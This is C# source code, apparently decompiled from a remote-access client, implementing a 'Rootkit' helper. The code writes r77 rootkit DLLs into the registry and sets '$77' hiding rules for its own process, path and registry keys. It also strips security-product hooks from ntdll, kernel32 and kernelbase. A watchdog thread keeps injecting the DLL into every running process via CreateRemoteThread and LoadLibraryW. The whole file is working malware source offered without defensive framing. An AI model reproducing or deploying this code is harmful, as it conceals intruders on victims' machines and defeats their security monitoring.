using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Client.Helper;

public static class Rootkit
{
	private class ShutdownHandler : Form
	{
		public ShutdownHandler()
		{
			((Control)this).Visible = false;
			((Form)this).ShowInTaskbar = false;
			((Form)this).WindowState = (FormWindowState)1;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).Msg == 17 || ((Message)(ref m)).Msg == 22)
			{
				ShowFiles();
			}
			((Form)this).WndProc(ref m);
		}
	}

	private const string HidePrefix = "$77";

	private static readonly string ConfigPath = "SOFTWARE\\$77config";

	private static bool _initialized = false;

	private const uint PROCESS_ALL_ACCESS = 2035711u;

	private const uint PROCESS_QUERY_INFORMATION = 1024u;

	private const uint MEM_COMMIT = 4096u;

	private const uint MEM_RESERVE = 8192u;

	private const uint PAGE_EXECUTE_READWRITE = 64u;

	private const uint PAGE_READONLY = 2u;

	private const uint FILE_MAP_READ = 4u;

	private const uint GENERIC_READ = 2147483648u;

	private const uint FILE_SHARE_READ = 1u;

	private const uint OPEN_EXISTING = 3u;

	private static HashSet<int> InjectedProcesses = new HashSet<int>();

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool IsWow64Process(IntPtr hProcess, out bool lpSystemInfo);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern IntPtr CreateFileMappingW(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, uint dwNumberOfBytesToMap);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);

	[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
	private static extern int memcpy(IntPtr dest, IntPtr src, uint count);

	public static void Initialize()
	{
		if (_initialized || Config.Rootkit != "true" || Config.Privilege != "Admin")
		{
			return;
		}
		_initialized = true;
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				Application.Run((Form)(object)new ShutdownHandler());
			}
			catch
			{
			}
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.IsBackground = true;
		thread.Name = "ShutdownMonitor";
		thread.Start();
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			try
			{
				ShowFiles();
				try
				{
					UnhookDll("ntdll.dll");
				}
				catch
				{
				}
				if (IntPtr.Size == 8)
				{
					try
					{
						UnhookDll("kernel32.dll");
					}
					catch
					{
					}
					try
					{
						UnhookDll("kernelbase.dll");
					}
					catch
					{
					}
				}
				ConfigureHiding();
				StoreDllsInRegistry();
				InjectIntoExplorer();
				Thread thread3 = new Thread(WatchdogThread);
				thread3.IsBackground = true;
				thread3.Name = "RootkitWatchdog";
				thread3.Start();
			}
			catch
			{
			}
		});
		thread2.IsBackground = true;
		thread2.Name = "RootkitInit";
		thread2.Start();
	}

	public static void ShowFiles()
	{
		try
		{
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			string[] array = new string[3] { "SOFTWARE\\$77config", "SOFTWARE\\$77dll32", "SOFTWARE\\$77dll64" };
			foreach (string text in array)
			{
				try
				{
					registryKey.DeleteSubKeyTree(EncryptString.Decode(text), throwOnMissingSubKey: false);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	private static void InjectIntoExplorer()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("explorer");
			for (int i = 0; i < processesByName.Length; i++)
			{
				InjectHookDll(processesByName[i]);
			}
		}
		catch
		{
		}
	}

	private static void StoreDllsInRegistry()
	{
		try
		{
			byte[] resourceFile = Methods.GetResourceFile("Client.Resources.r77-x86.dll");
			byte[] resourceFile2 = Methods.GetResourceFile("Client.Resources.r77-x64.dll");
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			using RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE", writable: true);
			if (registryKey2 != null)
			{
				if (resourceFile != null)
				{
					registryKey2.SetValue("$77dll32", resourceFile, RegistryValueKind.Binary);
				}
				if (resourceFile2 != null)
				{
					registryKey2.SetValue("$77dll64", resourceFile2, RegistryValueKind.Binary);
				}
			}
		}
		catch
		{
		}
	}

	private static void ConfigureHiding()
	{
		try
		{
			int id = Process.GetCurrentProcess().Id;
			string processName = Process.GetCurrentProcess().ProcessName;
			string fileName = Process.GetCurrentProcess().MainModule.FileName;
			RegistrySecurity registrySecurity = new RegistrySecurity();
			registrySecurity.AddAccessRule(new RegistryAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), RegistryRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
			using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			using (RegistryKey registryKey2 = registryKey.CreateSubKey(ConfigPath, writable: true))
			{
				registryKey2.SetAccessControl(registrySecurity);
			}
			using (RegistryKey registryKey3 = registryKey.CreateSubKey(ConfigPath + "\\pid", writable: true))
			{
				registryKey3?.SetValue($"{id}", id, RegistryValueKind.DWord);
			}
			using (RegistryKey registryKey4 = registryKey.CreateSubKey(ConfigPath + "\\process_names", writable: true))
			{
				registryKey4?.SetValue(processName, processName, RegistryValueKind.String);
			}
			using (RegistryKey registryKey5 = registryKey.CreateSubKey(ConfigPath + "\\paths", writable: true))
			{
				registryKey5?.SetValue(fileName, fileName, RegistryValueKind.String);
			}
			using RegistryKey registryKey6 = registryKey.CreateSubKey(ConfigPath + "\\registry_paths", writable: true);
			if (registryKey6 != null && !string.IsNullOrEmpty(Config.RegKey))
			{
				string text = "HKEY_CURRENT_USER\\" + Config.RegKey;
				registryKey6.SetValue(text, text, RegistryValueKind.String);
				string text2 = "HKEY_LOCAL_MACHINE\\" + Config.RegKey;
				registryKey6.SetValue(text2, text2, RegistryValueKind.String);
			}
		}
		catch
		{
		}
	}

	private static void UnhookDll(string dllName)
	{
		try
		{
			IntPtr moduleHandle = GetModuleHandle(dllName);
			if (moduleHandle == IntPtr.Zero)
			{
				return;
			}
			string path = Path.Combine(Environment.SystemDirectory, dllName);
			if (!File.Exists(path))
			{
				return;
			}
			using FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
			byte[] array = new byte[4096];
			fileStream.Read(array, 0, array.Length);
			if (array[0] != 77 || array[1] != 90)
			{
				return;
			}
			int num = BitConverter.ToInt32(array, 60);
			if (num < 0 || num > 4096)
			{
				return;
			}
			int num2 = BitConverter.ToInt16(array, num + 6);
			int num3 = BitConverter.ToInt16(array, num + 20);
			for (int i = 0; i < num2; i++)
			{
				int num4 = num + 24 + num3 + i * 40;
				if (num4 + 40 > array.Length)
				{
					break;
				}
				byte[] array2 = new byte[8];
				Array.Copy(array, num4, array2, 0, 8);
				if (Encoding.UTF8.GetString(array2).TrimEnd(new char[1]) == ".text")
				{
					int num5 = BitConverter.ToInt32(array, num4 + 12);
					int num6 = BitConverter.ToInt32(array, num4 + 8);
					int num7 = BitConverter.ToInt32(array, num4 + 20);
					if (num6 > 0)
					{
						byte[] array3 = new byte[num6];
						fileStream.Seek(num7, SeekOrigin.Begin);
						fileStream.Read(array3, 0, array3.Length);
						IntPtr intPtr = (IntPtr)((long)moduleHandle + num5);
						if (VirtualProtect(intPtr, (uint)num6, 64u, out var lpflOldProtect))
						{
							try
							{
								Marshal.Copy(array3, 0, intPtr, array3.Length);
							}
							finally
							{
								VirtualProtect(intPtr, (uint)num6, lpflOldProtect, out var _);
							}
							try
							{
								DllImport.FlushInstructionCache(new IntPtr(-1), intPtr, (UIntPtr)(ulong)num6);
								break;
							}
							catch
							{
								break;
							}
						}
						break;
					}
					break;
				}
			}
		}
		catch
		{
		}
	}

	private static void WatchdogThread()
	{
		while (true)
		{
			try
			{
				InjectAllProcesses();
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
	}

	private static void InjectAllProcesses()
	{
		Process[] processes = Process.GetProcesses();
		int id = Process.GetCurrentProcess().Id;
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Id > 4 && process.Id != id)
				{
					process.ProcessName.Equals("explorer", StringComparison.OrdinalIgnoreCase);
					InjectHookDll(process);
				}
			}
			catch
			{
			}
		}
	}

	private static void InjectHookDll(Process targetProcess)
	{
		if (InjectedProcesses.Contains(targetProcess.Id))
		{
			return;
		}
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			intPtr = OpenProcess(2035711u, bInheritHandle: false, targetProcess.Id);
			if (intPtr == IntPtr.Zero)
			{
				return;
			}
			bool flag = Is64Bit(intPtr);
			if (flag != Environment.Is64BitProcess)
			{
				return;
			}
			byte[] array = (flag ? Methods.GetResourceFile("Client.Resources.r77-x64.dll") : Methods.GetResourceFile("Client.Resources.r77-x86.dll"));
			if (array != null)
			{
				string text = Path.Combine(Path.GetTempPath(), "$77temp");
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				string text2 = Path.Combine(text, $"{Guid.NewGuid()}.dll");
				File.WriteAllBytes(text2, array);
				IntPtr procAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
				IntPtr intPtr2 = VirtualAllocEx(intPtr, IntPtr.Zero, (uint)((text2.Length + 1) * 2), 12288u, 4u);
				byte[] bytes = Encoding.Unicode.GetBytes(text2 + "\0");
				WriteProcessMemory(intPtr, intPtr2, bytes, (uint)bytes.Length, out var lpNumberOfBytesWritten);
				IntPtr intPtr3 = CreateRemoteThread(intPtr, IntPtr.Zero, 0u, procAddress, intPtr2, 0u, out lpNumberOfBytesWritten);
				if (intPtr3 != IntPtr.Zero)
				{
					InjectedProcesses.Add(targetProcess.Id);
					CloseHandle(intPtr3);
				}
			}
		}
		catch
		{
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				CloseHandle(intPtr);
			}
		}
	}

	private static bool Is64Bit(IntPtr hProcess)
	{
		if (!Environment.Is64BitOperatingSystem)
		{
			return false;
		}
		if (IsWow64Process(hProcess, out var lpSystemInfo))
		{
			return !lpSystemInfo;
		}
		return false;
	}
}
